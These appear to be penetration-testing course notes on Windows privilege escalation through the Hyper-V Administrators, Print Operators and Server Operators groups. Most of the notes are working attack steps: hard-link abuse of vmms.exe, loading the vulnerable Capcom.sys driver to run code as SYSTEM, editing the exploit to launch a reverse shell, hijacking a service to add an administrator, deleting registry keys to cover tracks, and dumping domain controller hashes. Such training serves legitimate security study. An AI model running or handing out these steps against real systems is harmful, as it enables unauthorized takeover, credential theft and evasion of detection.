Hyper-V Admins could easily create a clone of the DC and mount the VDI/VHDX.

Upon deleteing a VM, `vmms.exe` attempts to restore the original file permissions of the
corresponding .vhdx file and does so as NT AUTHORITY/SYSTEM without impersonating
the user. WE can delete the .vhdx file and create a native hard link to point this file
to a protected SYSTEM file, which we will have full permissions to.

If the operating system is vulnerable to CVE-2018-0952 or CVE-2019-0841, we can leverage
this to gain SYSTEM privileges. Otherwise, we can try to take advantage of an application
on the server that has installed a service running in the context of SYSTEM.

### Target File

An example of this is Firefox, which installs the `Mozilla Maintenance Service`. We can update
this PoC to grant our current user full permissions on the file below:
https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1

```
C:\Program Files (x86)\Mozilla Maintenancce Service\maintenanceservice.exe
takeown /F C:\Program Files (x86)\Mozilla Maintenancce Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```

# Print Operators

`SeLoadDriverPrivilege`

This repo https://github.com/hfiref0x/UACME features a comprehensive list of UAC bypasses
which can be used form the command line.

```
whoami /priv
```

If we examine the privileges again, SeLoadDriverPrivilege is visible but disabled.

It's well known that the driver `Capcom.sys` contains functionality to allow any user to execute
shellcode with SYSTEM privileges. We can use our privileges to load this vulnerable driver
and escalate privileges.

We can use this tool https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp to load the driver. The PoC enables the privilege as well as
loads the driver for us.

Download it locally and edit it, pasting the includes listed here:
```
#include <windows.h>
#include <assert.h>
#include <winternl.h>
#include <sddl.h>
#include <stdio.h>
#include "tchar.h"
```

Next, from Visual Studio 2019 Developer Command Prompt, compile it using `cl.exe`
Then download the Capcom.sys driver and save it to `C:\temp`. Issue the command to add
reference to this driver under our HKEY_CURRENT_USER tree.

```
cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp

reg add HKCU\System\CurrentControlSet\CAPCOM 
	/v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"
```

Verify the driver is not loaded:
```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

Verify Privilege is enabled:
```
EnableSeLoadDriverPrivilege.exe
```

Verify Capcom Driver is listed:
```
.\DriverView.exe /stext drivers.txt
cat drivers.txt | Select-String -pattern Capcom
```

Use ExploitCapcom Tool to Escalate Privileges:
```
.\ExploitCapcom.exe
```

## Alternate Exploitation - No GUI

If we do not have GUI access to the target, we will have to modify the `ExploitCapcom.cpp` code before compiling. Here we can edit line 292 and replace `C:\\Windows\\system32\\cmd.exe"` with, say, a reverse shell binary created with `msfvenom`, for example: `c:\ProgramData\revshell.exe`.

Code: c

```c
// Launches a command shell process
static bool LaunchShell()
{
    TCHAR CommandLine[] = TEXT("C:\\Windows\\system32\\cmd.exe");
    PROCESS_INFORMATION ProcessInfo;
    STARTUPINFO StartupInfo = { sizeof(StartupInfo) };
    if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE,
        CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo,
        &ProcessInfo))
    {
        return false;
    }

    CloseHandle(ProcessInfo.hThread);
    CloseHandle(ProcessInfo.hProcess);
    return true;
}
```

The `CommandLine` string in this example would be changed to:

```c
 TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");
```

We would set up a listener based on the msfvenom payload we generated and hopefully receieve
a reverse shell connection back when executing the exploit. If the reverse connection is blocked
we can try a bind shell or exec/add user payload.

#### Automating the Steps

We can use a tool such as EoPLoaderDriver to automate the process.
```
EoPLoadDriver.exe System\CurrentControlSet\Capcom C:\Tools\Capcom.sys
```

## Clean-up

#### Removing Registry Key

We can cover our tracks a bit by deleting the registry key added earlier.
```cmd-session
reg delete HKCU\System\CurrentControlSet\Capcom
```

# Server Operators

The Server Operators groups allows members to administer Windows servers without needing
assignment of Domain Admin privileges. It's a very highly privileged group.

Membership of this group confers the powerful `SeBackupPrivilege` and `SeRestorePrivilege`.

#### Querying the AppReadiness Service
```
sc qc AppReadiness
```

#### Checking Service Permissions with PsService
```
PsService.exe security AppReadiness
```

#### Checking Local Admin Group Membership
```
net local group Administrators
```

#### Modifying the Service Binary Path
```
sc config AppReadiness binPath="
	cmd /c net localgroup Administrators server_adm /add"
```

#### Starting the Service
```
sc start AppReadiness
```

#### Confirming Local Admin Group Membership
```
net local group Administrators
```

#### Confirming Local Admin Access on the DC
```bash
crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
```

#### Retrieving NTLM Password Hashes from the DC
```bash
secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
```

